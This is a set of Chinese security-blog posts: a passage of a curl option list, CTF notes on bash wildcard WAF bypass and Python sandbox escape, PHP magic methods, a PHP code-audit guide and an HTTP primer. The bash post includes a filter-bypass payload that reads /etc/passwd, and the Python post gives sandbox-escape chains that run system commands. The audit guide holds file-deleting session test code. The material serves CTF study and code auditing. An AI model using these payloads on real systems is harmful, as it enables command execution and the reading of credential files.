在指定的端口上使用代理 --proxy-anyauth 在代理上使用 &quot;any&quot; 认证方法 (H) --proxy-basic 在代理上使用 Basic 认证 (H) --proxy-digest 在代理上使用 Digest 认证 (H) --proxy-negotiate 在代理上使用 Negotiate 认证 (H) --proxy-ntlm 在代理上使用 NTLM 认证 (H) -U, --proxy-user USER[:PASSWORD] 代理用户名及密码 --proxy1.0 HOST[:PORT] 在指定的端口上使用 HTTP/1.0 代理 -p, --proxytunnel 使用HTTP代理 (用于 CONNECT) --pubkey KEY 公钥文件名 (SSH) -Q, --quote CMD 在传输开始前向服务器发送命令 (F/SFTP) --random-file FILE 读取随机数据的文件 (SSL) -r, --range RANGE 仅检索范围内的字节 --raw 使用原始HTTP传输，而不使用编码 (H) -e, --referer Referer URL (H) -J, --remote-header-name 从远程文件读取头信息 (H) -O, --remote-name 将输出写入远程文件 --remote-name-all 使用所有URL的远程文件名 -R, --remote-time 将远程文件的时间设置在本地输出上 -X, --request COMMAND 使用指定的请求命令 --resolve HOST:PORT:ADDRESS 将 HOST:PORT 强制解析到 ADDRESS --retry NUM 出现问题时的重试次数 --retry-delay SECONDS 重试时的延时时长 --retry-max-time SECONDS 仅在指定时间段内重试 -S, --show-error 显示错误. 在选项 -s 中，当 curl 出现错误时将显示 -s, --silent Silent模式。不输出任务内容 --socks4 HOST[:PORT] 在指定的 host + port 上使用 SOCKS4 代理 --socks4a HOST[:PORT] 在指定的 host + port 上使用 SOCKSa 代理 --socks5 HOST[:PORT] 在指定的 host + port 上使用 SOCKS5 代理 --socks5-hostname HOST[:PORT] SOCKS5 代理，指定用户名、密码 --socks5-gssapi-service NAME 为gssapi使用SOCKS5代理服务名称 --socks5-gssapi-nec 与NEC Socks5服务器兼容 -Y, --speed-limit RATE 在指定限速时间之后停止传输 -y, --speed-time SECONDS 指定时间之后触发限速. 默认 30 --ssl 尝试 SSL/TLS (FTP, IMAP, POP3, SMTP) --ssl-reqd 需要 SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2 使用 SSLv2 (SSL) -3, --sslv3 使用 SSLv3 (SSL) --ssl-allow-beast 允许的安全漏洞，提高互操作性(SSL) --stderr FILE 重定向 stderr 的文件位置. - means stdout --tcp-nodelay 使用 TCP_NODELAY 选项 -t, --telnet-option OPT=VAL 设置 telnet 选项 --tftp-blksize VALUE 设备 TFTP BLKSIZE 选项 (必须 &gt;512) -z, --time-cond TIME 基于时间条件的传输 -1, --tlsv1 使用 =&gt; TLSv1 (SSL) --tlsv1.0 使用 TLSv1.0 (SSL) --tlsv1.1 使用 TLSv1.1 (SSL) --tlsv1.2 使用 TLSv1.2 (SSL) --trace FILE 将 debug 信息写入指定的文件 --trace-ascii FILE 类似 --trace 但使用16进度输出 --trace-time 向 trace/verbose 输出添加时间戳 --tr-encoding 请求压缩传输编码 (H) -T, --upload-file FILE 将文件传输（上传）到指定位置 --url URL 指定所使用的 URL -B, --use-ascii 使用 ASCII/text 传输 -u, --user USER[:PASSWORD] 指定服务器认证用户名、密码 --tlsuser USER TLS 用户名 --tlspassword STRING TLS 密码 --tlsauthtype STRING TLS 认证类型 (默认 SRP) --unix-socket FILE 通过这个 UNIX socket 域连接 -A, --user-agent STRING 要发送到服务器的 User-Agent (H) -v, --verbose 显示详细操作信息 -V, --version 显示版本号并退出 -w, --write-out FORMAT 完成后输出什么 --xattr 将元数据存储在扩展文件属性中 -q .curlrc 如果作为第一个参数无效]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash通配符与命令执行]]></title>
    <url>%2F2019%2F02%2F14%2Fbash%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[关于bash通配符有以下几个 ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/??t或者/???/c?t等来查找到.如果在绕waf的过程里面应该是可以直接拿出来用的. root@bee-box:~# echo /???/c?t /bin/cat root@bee-box:~# echo /???/??t /bin/cat /dev/net /etc/apt /etc/opt /etc/rmt /var/opt 试试常见的cat /etc/passwd我们用/???/??t /???/??ss??来替换 cat /etc/passwd /???/??t /???/??ss?? 可以看到达到了同样的效果 在安恒月赛里出现过一道题目： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9_$]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 字母和数字都被过滤了，我们就可以利用上面的特性 /???/??? =&gt; /bin/cat 详细的wp在安全客:https://www.anquanke.com/post/id/160582?from=singlemessage]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸小结]]></title>
    <url>%2F2019%2F02%2F12%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() 在 Python 中导入模块的方法通常有三种（xxx 为模块名称）： import xxx from xxx import * __import__(&apos;xxx&apos;) 我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。 除此之外，我们也可以通过路径引入模块： 如在 linux 系统中 Python 的 os 模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos; &gt;&gt;&gt; import os &gt;&gt;&gt; 其他的危险函数举例 如 execfile 文件执行 &gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;) &gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin ... &gt;&gt;&gt; getcwd() &apos;/usr/lib/python2.7&apos; timeit import timeit timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1) exec 和 eval eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;) platform import platform print platform.popen(&apos;dir&apos;).read() 正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。下面讨论一下这种情况下应该如何进行绕过 Python 的内建函数&gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;] 通过该命令我们可以获取内置函数的列表 禁用import的绕过在Python里，这段[].class.mro[-1].subclasses()魔术代码，不用import任何模块，但可调用任意模块的方法。 查看Python版本 Python2.x和Python3.x有一些区别，Bypass前最好知道Python版本。 我们知道，sys.version可以查看python版本。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.version globals该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os,sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals 属性访问全局的变量 &gt;&gt;&gt; a = lambda x:x+1 &gt;&gt;&gt; dir(a) [&apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;func_closure&apos;, &apos;func_code&apos;, &apos;func_defaults&apos;, &apos;func_dict&apos;, &apos;func_doc&apos;, &apos;func_globals&apos;, &apos;func_name&apos;] &gt;&gt;&gt; a.__globals__ {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7fcd7601ccf8&gt;, &apos;__package__&apos;: None} &gt;&gt;&gt; a.func_globals {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7f1095d72cf8&gt;, &apos;__package__&apos;: None} (lambda x:1).__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;) _globals__ 是一个字典，默认有builtins对象，在python sandbox中一般会过滤builtins内容，这样globals里面的builtins也就没有什么意义了,即使重新import builtin 还是一样. 执行系统命令在python2.7.10里，[].class.base.subclasses() 里面有很多库调用了我们需要的模块os /usr/lib/python2.7/warning.py 58 &lt;class &apos;warnings.WarningMessage&apos;&gt; 59 &lt;class &apos;warnings.catch_warnings&apos;&gt; /usr/lib/python2.7/site.py 71 &lt;class &apos;site._Printer&apos;&gt; 72 &lt;class &apos;site._Helper&apos;&gt; 76 &lt;class &apos;site.Quitter&apos;&gt; 我们来看一下/usr/lib/python2.7/warning.py导入的模块 import linecache import sys import types 跟踪linecache文件/usr/lib/python2.7/linecache.py import sysimport os 于是一个利用链就可以构造了: [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;) [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-项目发布-莫离新版授权系统]]></title>
    <url>%2F2019%2F02%2F11%2F%E7%BD%AE%E9%A1%B6-%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83-%E8%8E%AB%E7%A6%BB%E6%96%B0%E7%89%88%E6%8E%88%E6%9D%83%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[该项目已发布到各大论坛，公益作品请勿盗用二开 本系统可作为多款产品的网络验证程序，对接性灵活，UI界面取自原生彩虹登录界面 系统支持添加代理商和高级代理商 更换授权信息时需要进行主人身份验证，大大增强了系统的安全性 默认添加机器人对接接口，其他程序对接自行修改根目录下的yunsq.php文件即可 配置方法： 数据库信息配置文件请修改 includes\config.php 然后导入install.sql 超级管理员后台路径为 /qq80743522/login.php 代理商与高级代理商后台路径为 /user/login.php 项目地址：https://github.com/yemoli/yemoli-auth]]></content>
      <tags>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常用魔术方法]]></title>
    <url>%2F2019%2F02%2F11%2FPHP%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[PHP将所有以 __ （两个下划线）开头的类方法保留为魔术方法。下面记录一下常用的魔术方法： __sleep在使用 serialize() 函数时，程序会检查类中是否存在一个 __sleep() 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。 __wakeup在使用 unserialize() 时，会检查是否存在一个 __wakeup() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。 __toString__toString() 方法用于定义一个类被当成字符串时该如何处理。 123456789101112131415161718&lt;?phpclass TestClass&#123; public $foo; public function __construct($foo) &#123; $this-&gt;foo = $foo; &#125; public function __toString() &#123; return $this-&gt;foo; &#125;&#125;$class = new TestClass('Hello');echo $class; // 运行结果：Hello?&gt; __invoke1234567891011&lt;?phpclass CallableClass &#123; function __invoke($x) &#123; var_dump($x); &#125;&#125;$obj = new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt; __construct具有 __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。 __destruct__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __set给不可访问属性赋值时，__set() 会被调用。 __get读取不可访问属性的值时，__get() 会被调用。 __isset对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 __unset对不可访问属性调用 unset() 时，__unset() 会被调用。 __call在对象中调用一个不可访问方法时，__call() 会被调用。 123456789101112131415&lt;?phpclass MethodTest&#123; public function __call($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;$obj = new MethodTest;$obj-&gt;callTest('arg1','arg2');/*运行结果Triggering __call method when calling method 'callTest' with arguments 'arg1, arg2'.*/?&gt; __callStatic在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 12345678910111213&lt;?phpclass MethodTest&#123; public static function __callStatic($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;MethodTest::callStaticTest('arg3','arg4'); // As of PHP 5.3.0/*运行结果Triggering __call method when calling method 'callStaticTest' with arguments 'arg3, arg4'.*/?&gt;]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-PHP代码审计]]></title>
    <url>%2F2019%2F02%2F09%2F%E8%BD%AC%E8%BD%BD-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 学习代码审计的目标是能够独立完成对代码安全监测。其通用的思路有： 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文件。 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是否出现漏洞。 继续跟读首页文件index.php，了解程序运作时调用了哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读。 一、输入输出验证用户的一切输入都是有害的，大多数漏洞的形成原因主要都是未对输入数据进行安全验证或对输出数据未经过安全处理。 所以我们需要针对输入输出数据进行以下的安全检查： 对数据进行精确匹配 接受白名单的数据 拒绝黑名单的数据 对匹配黑名单的数据进行编码 在PHP中，能够由用户输入的变量有： 12345678910111213$_SERVER$_GET$_POST$_COOKIE$_REQUEST$_FILES$_ENV$_HTTP_COOKIE_VARS$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS 我们需要针对这些函数进行必要的安全检查。 1. XSS反射型XSS出现在接受用户提交的变量后进行处理，直接输出显示给酷护短，存储型XSS出现在用户提交的变量进行处理后存储到数据库中，再从数据库中读取这条信息输出到客户端。 对于反射型XSS，应当在当前的PHP页面检查变量被提交时是否经过了安全检查，是否在当前的PHP页面有立即显示。 对于存储型XSS，首先对于输入的数据进行安全检查后再写入数据库，在输出显示时是否有安全检查。 防御策略： 对输入的数据进行严格的匹配，过滤所有的非法字符进行过滤。 对于输出的数据进行HTML编码， 123456789&lt; → &amp;lt;&gt; → &amp;gt;( → &amp;#40;) → &amp;#41;# → &amp;#35&amp; → &amp;amp;" → &amp;quot;’ → &amp;apos;` → %60 2.SQL注入SQL注入关系到的是数据库安全，所以对于用户的恶意输入必须做严格的过滤。 在SQL注入攻击中，一般会用到 ’、select、insert、delete、from、=、in、update等关键字，需要针对这些字符进行过滤，要查看传递的变量参数是否用户可控制，以及它们是否做到安全检查。 防御策略： 使用参数化查询 3. 文件上传任意文件上传可能会造成网站getshell，也是一个非常危险的功能，对于文件上传也需要非常警惕。 PHP的文件上传通常会使用move_uploaded_file()函数，在文件上传的位置也需要进行上传文件的检测，做好安全检查。 防御策略： 使用白名单检测上传文件后缀。 上传后随机生成文件名称。 上传目录限制文件不可执行。 注意防范%00进行的截断。 4. 文件包含文件包含漏洞可以读取敏感文件，配合文件上传功能可以得到webshell,远程文件包含可以直接远程包含shell。 PHP可能出现文件包含的函数：include、include_once、require、require_once、show_source、highlight_file、readfile、file_get_contents、fopen、file。 防御策略： 对输入数据进行精确匹配。 过滤参数中的/、..等字符。 5. 命令注入php执行系统命令可以使用以下几个函数：system、exec、passthru、“、shell_exec、popen、proc_open、pcntl_exec。 我们通过在全部程序文件中搜索这些函数，确定函数的参数是否会因为外部提交而改变，检查这些参数是否有经过安全处理。 防御策略： 使用自定义函数或函数库来替代外部命令的功能。 使用escapeshellarg函数来处理命令参数。 使用safe_mode_exec_dir指定可执行文件的路径。 6. 代码注入PHP可能出现代码注入的函数：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function。 查找程序中程序中使用这些函数的地方，检查提交变量是否用户可控，有无做输入验证 防御策略： 输入数据精确匹配。 使用白名单过滤可执行的函数。 7. 文件管理PHP的用于文件管理的函数，如果输入变量可由用户提交，程序中也没有做数据验证，可能成为高危漏洞。我们应该在程序中搜索如下函数：copy、rmdir、unlink、delete、fwrite、chmod、fgetc、 fgetcsv、fgets、fgetss、file、file_get_contents、fread、readfile、ftruncate、 file_put_contents、fputcsv、fputs，但通常PHP中每一个文件操作函数都可能是危险的。 防御策略： 对提交数据进行严格匹配。 限定文件可操作的目录。 8. 变量覆盖PHP的变量覆盖会出现在以下集中情况： 遍历初始化变量 函数覆盖变量parse_str、mb_parse_str、import_request_variables 3.Register_globals=ON时，GET方式提交变量会直接覆盖 防御策略： 设置Register_globals=OFF。 不使用覆盖变量的函数来获取变量。 二、会话安全1. HTTPOnly设置打开该指令可以有效预防通过XSS攻击劫持会话ID。 2. domain设置检查session.cookie_domain是否只包含本域，如果是父域，则其他子域能够获取本域的cookies。 3. path设置检查session.cookie_path，如果网站本身应用在/app，则path必须设置为/app/，才能保证安全。 4. cookies持续时间检查session.cookie_lifetime，如果时间设置过程过长，即使用户关闭浏览器，攻击者也会危害到帐户安全。 5. secure设置如果使用HTTPS，那么应该设置session.cookie_secure=ON，确保使用HTTPS来传输cookies。 6. session固定如果当权限级别改变时（例如核实用户名和密码后，普通用户提升到管理员），我们就应该修改即将重新生成的会话ID，否则程序会面临会话固定攻击的风险。 7. CSRF跨站请求伪造攻击，是攻击者伪造一个恶意请求链接，通过各种方式让正常用户访问后，会以用户的身份执行这些恶意的请求。我们应该对比较重要的程序模块，比如修改用户密码，添加用户的功能进行审查，检查有无使用一次性令牌防御csrf攻击。 三、加密1. 明文存储密码采用明文的形式存储密码会严重威胁到用户、应用程序、系统安全。 2. 密码弱加密使用容易破解的加密算法，MD5加密已经部分可以利用md5破解网站来破解。 3. 密码存储在攻击者能访问到的文件例如：保存密码在txt、ini、conf、inc、xml等文件中，或者直接写在HTML注释中。 四、认证和授权1. 用户认证检查代码进行用户认证的位置，是否能够绕过认证，例如：登录代码可能存在表单注入。 检查登录代码有无使用验证码等，防止暴力破解的手段。 2. 函数或文件的未认证调用一些管理页面是禁止普通用户访问的，有时开发者会忘记对这些文件进行权限验证，导致漏洞发生 某些页面使用参数调用功能，没有经过权限验证，比如index.php?action=upload。 3. 密码硬编码有的程序会把数据库链接账号和密码，直接写到数据库链接函数中。 五、PHP危险函数1. 缓冲区溢出（1）confirm_phpdoc_compiled 影响版本： phpDocumentor phpDocumentor 1.3.1 phpDocumentor phpDocumentor 1.3 RC4 phpDocumentor phpDocumentor 1.3 RC3 phpDocumentor phpDocumentor 1.2.3 phpDocumentor phpDocumentor 1.2.2 phpDocumentor phpDocumentor 1.2.1 phpDocumentor phpDocumentor 1.2 （2）mssql_pconnect/mssql_connect 影响版本：PHP &lt; = 4.4.6 （3）crack_opendict 影响版本：PHP = 4.4.6 （4）snmpget 影响版本：PHP &lt;= 5.2.3 （5）ibase_connect 影响版本：PHP = 4.4.6 （6）unserialize 影响版本：PHP 5.0.2、PHP 5.0.1、PHP 5.0.0、PHP 4.3.9、PHP 4.3.8、PHP 4.3.7、PHP 4.3.6、PHP 4.3.3、PHP 4.3.2、PHP 4.3.1、PHP 4.3.0、PHP 4.2.3、PHP 4.2.2、PHP 4.2.1、PHP 4.2.0、PHP 4.2-dev、PHP 4.1.2、PHP 4.1.1、PHP 4.1.0、PHP 4.1、PHP 4.0.7、PHP 4.0.6、PHP 4.0.5、PHP 4.0.4、PHP 4.0.3pl1、PHP 4.0.3、PHP 4.0.2、PHP 4.0.1pl2、PHP 4.0.1pl1、PHP 4.0.1 2. session_destroy()删除文件漏洞影响版本：不祥，需要具体测试。 测试代码如下： 123456789101112&lt;?phpsession_save_path('./');session_start();if($_GET['del']) &#123;session_unset();session_destroy();&#125;else&#123;$_SESSION['do']=1;echo(session_id());print_r($_SESSION);&#125;?&gt; 当我们提交cookieHPSESSIONID=/../1.php，相当于删除了此文件。 3. unset()-zend_hash_del_key_or_index漏洞zend_hash_del_key_or_index PHP4小于4.4.3和PHP5小于5.1.3，可能会导致zend_hash_del删除了错误的元素。当PHP的unset()函数被调用时，它会阻止变量被unset。 六、信息泄露phpinfo()如果攻击者可以浏览到程序中调用phpinfo显示的环境信息，会为进一步攻击提供便利。 七、PHP环境1. open_basedir设置open_basedir能限制应用程序能访问的目录，检查有没有对open_basedir进行设置，当然有的通过web服务器来设置，例如：apache的php_admin_value，nginx+fcgi通过conf来控制php设置。 2. allow_url_fopen设置如果allow_url_fopen=ON，那么php可以读取远程文件进行操作，这个容易被攻击者利用。 3. allow_url_include设置如果allow_url_include=ON，那么php可以包含远程文件，会导致严重漏洞。 4. safe_mode_exec_dir设置这个选项能控制php可调用的外部命令的目录，如果PHP程序中有调用外部命令，那么指定外部命令的目录，能控制程序的风险。 5. magic_quote_gpc设置这个选项能转义提交给参数中的特殊字符，建议设置magic_quote_gpc=ON。 6. register_globals设置开启这个选项，将导致php对所有外部提交的变量注册为全局变量，后果相当严重。 7. safe_mode设置safe_mode是PHP的重要安全特性，建议开启。 8. session_use_trans_sid设置如果启用 session.use_trans_sid，会导致 PHP 通过 URL 传递会话 ID，这样一来，攻击者就更容易劫持当前会话，或者欺骗用户使用已被攻击者控制的现有会话。 9. display_errors设置如果启用此选项，PHP将输出所有的错误或警告信息，攻击者能利用这些信息获取web根路径等敏感信息。 10. expose_php设置如果启用 expose_php 选项，那么由 PHP 解释器生成的每个响应都会包含主机系统上所安装的 PHP 版本。了解到远程服务器上运行的 PHP 版本后，攻击者就能针对系统枚举已知的盗取手段，从而大大增加成功发动攻击的机会。]]></content>
      <tags>
        <tag>转载文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP简介]]></title>
    <url>%2F2019%2F02%2F08%2FHTTP%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[内容转自博客园 HTTP简介HTTP协议是Hyper Text Transfer Protocol（超文本传输协议）的缩写,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等）。 HTTP是一个属于应用层的面向对象的协议，由于其简捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中使用的是HTTP/1.0的第六版，HTTP/1.1的规范化工作正在进行之中，而且HTTP-NG(Next Generation of HTTP)的建议已经提出。 HTTP协议工作于客户端-服务端架构为上。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。Web服务器根据接收到的请求后，向客户端发送响应信息。 主要特点1、简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。 2、灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。 3.无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 4.无状态：HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。5、支持B/S及C/S模式。 HTTP之URLHTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。URL是一种特殊类型的URI，包含了用于查找某个资源的足够的信息 URL,全称是UniformResourceLocator, 中文叫统一资源定位符,是互联网上用来标识某一处资源的地址。以下面这个URL为例，介绍下普通URL的各部分组成： http://www.aspxfans.com:8080/news/index.asp?boardID=5&amp;ID=24618&amp;page=1#name 从上面的URL可以看出，一个完整的URL包括以下几部分：1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符 2.域名部分：该URL的域名部分为“www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用 3.端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口 4.虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/” 